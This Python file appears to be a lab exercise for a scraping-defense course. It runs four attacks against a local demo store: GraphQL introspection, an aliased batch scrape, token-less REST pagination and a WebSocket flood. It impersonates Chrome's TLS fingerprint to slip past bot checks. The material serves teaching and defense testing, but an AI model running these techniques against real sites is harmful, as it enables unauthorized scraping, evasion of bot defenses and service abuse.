"""
Capstone Round 1 Attack — API abuse: GraphQL + REST + WebSocket (W3 Ch2)

Four cheap API attacks that the browser stack (L0-L4) never sees, because none
of them loads a page or runs a line of JavaScript:

    introspection   POST a __schema query and get the whole API map in one trip
    batch scrape    one POST that aliases product(...) across the catalog
    REST pagination  walk /api/v1/products with no (or a replayed) token
    WS flood        open the price WebSocket and push messages as fast as it takes

Each is a Chrome-TLS curl_cffi client (perfect JA4), so L0's TLS/UA check
passes. They work at DEFENSE_LEVEL 4 and are stopped at 5, once you harden the
API (defenses/api_hardening.py) and bind tokens to JA4 (demo_site/api_auth.py).

Run (store running):
    python attacks/round1_api.py
"""

import json
import os
import sys
from urllib.parse import urlparse

from curl_cffi import requests as cffi

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import Cost, egress_pool, report, rng_for, summary, target  # noqa: E402

SKUS = ["lab-runner-9", "trail-socks", "laces-neon", "cap-classic"]


def _session(egress):
    s = cffi.Session(impersonate="chrome150", verify=False, timeout=15)
    s.headers.update({"X-Lab-Egress": egress})
    return s


def introspection_scan(base, egress):
    s = _session(egress)
    q = {"query": "{ __schema { queryType { name } types { name fields { name } } } }"}
    r = s.post(f"{base}/graphql", json=q)
    ok = r.status_code == 200 and "data" in (r.json() if r.headers.get("content-type", "").startswith("application/json") else {})
    reasons = [] if ok else (r.json().get("errors", [{}])[0].get("reasons", ["blocked"]) if r.status_code == 403 else ["blocked"])
    return {"technique": "graphql_introspection", "scraped": ok, "outcome": "allow" if ok else "block",
            "reasons": reasons if isinstance(reasons, list) else [str(reasons)], "sid": None}


def batch_scrape(base, egress):
    s = _session(egress)
    aliases = " ".join(f'p{i}: product(sku: "{sku}") {{ sku name price }}' for i, sku in enumerate(SKUS * 50))
    r = s.post(f"{base}/graphql", json=[{"query": "{ " + aliases + " }"}])
    body = r.json() if r.headers.get("content-type", "").startswith("application/json") else {}
    got = isinstance(body, list) and body and "data" in body[0]
    reasons = [] if got else (body.get("errors", [{}])[0].get("reasons", ["blocked"]) if isinstance(body, dict) else ["blocked"])
    return {"technique": "graphql_batch", "scraped": bool(got), "outcome": "allow" if got else "block",
            "reasons": reasons if isinstance(reasons, list) else ["blocked"], "sid": None}


def rest_pagination(base, egress):
    s = _session(egress)
    pages, ok = 0, False
    for offset in range(0, 120, 24):  # walk the catalog without a JA4-bound token
        r = s.get(f"{base}/api/v1/products?limit=24&offset={offset}")
        if r.status_code == 200:
            pages += 1
            ok = True
        else:
            return {"technique": "rest_pagination", "scraped": False, "outcome": "block",
                    "reasons": r.json().get("reasons", ["blocked"]), "sid": None}
    return {"technique": "rest_pagination", "scraped": ok, "outcome": "allow",
            "reasons": [f"paged catalog x{pages} with no token"], "sid": None}


def ws_flood(base, egress, messages=120):
    """Best-effort: the WS server is on PORT+1. Skipped if it isn't reachable."""
    host = urlparse(base).hostname or "127.0.0.1"
    ws_port = int(urlparse(base).port or 8443) + 1
    url = f"ws://{host}:{ws_port}"
    try:
        from websockets.sync.client import connect
    except Exception:
        return {"technique": "ws_flood", "scraped": False, "outcome": "skip",
                "reasons": ["websockets client not installed"], "sid": None}
    try:
        accepted = 0
        with connect(url, open_timeout=3) as ws:
            ws.recv()  # hello
            for _ in range(messages):
                try:
                    ws.send(json.dumps({"sub": "price", "sku": "lab-runner-9"}))
                    ws.recv()
                    accepted += 1
                except Exception:
                    break  # the server closed us: rate limit kicked in
    except Exception as exc:
        return {"technique": "ws_flood", "scraped": False, "outcome": "skip",
                "reasons": [f"WS endpoint unreachable: {exc}"], "sid": None}
    flooded = accepted >= messages  # got every message through => not metered
    return {"technique": "ws_flood", "scraped": flooded, "outcome": "allow" if flooded else "block",
            "reasons": [f"{accepted}/{messages} messages accepted before the server cut us off"], "sid": None}


def run(verbose=False):
    base = target()
    rng = rng_for("round1")
    pool = egress_pool()
    with Cost() as cost:
        results = [
            introspection_scan(base, rng.choice(pool)),
            batch_scrape(base, rng.choice(pool)),
            rest_pagination(base, rng.choice(pool)),
            ws_flood(base, rng.choice(pool)),
        ]
    s = summary("round1_api", results, cost, success_key="scraped")
    if verbose:
        report(s, success_label="API techniques succeeded")
        for r in results:
            print(f"  {r['technique']:<22} {r['outcome']:<6} {r['reasons'][:2]}")
    return s


if __name__ == '__main__':
    run(verbose=True)
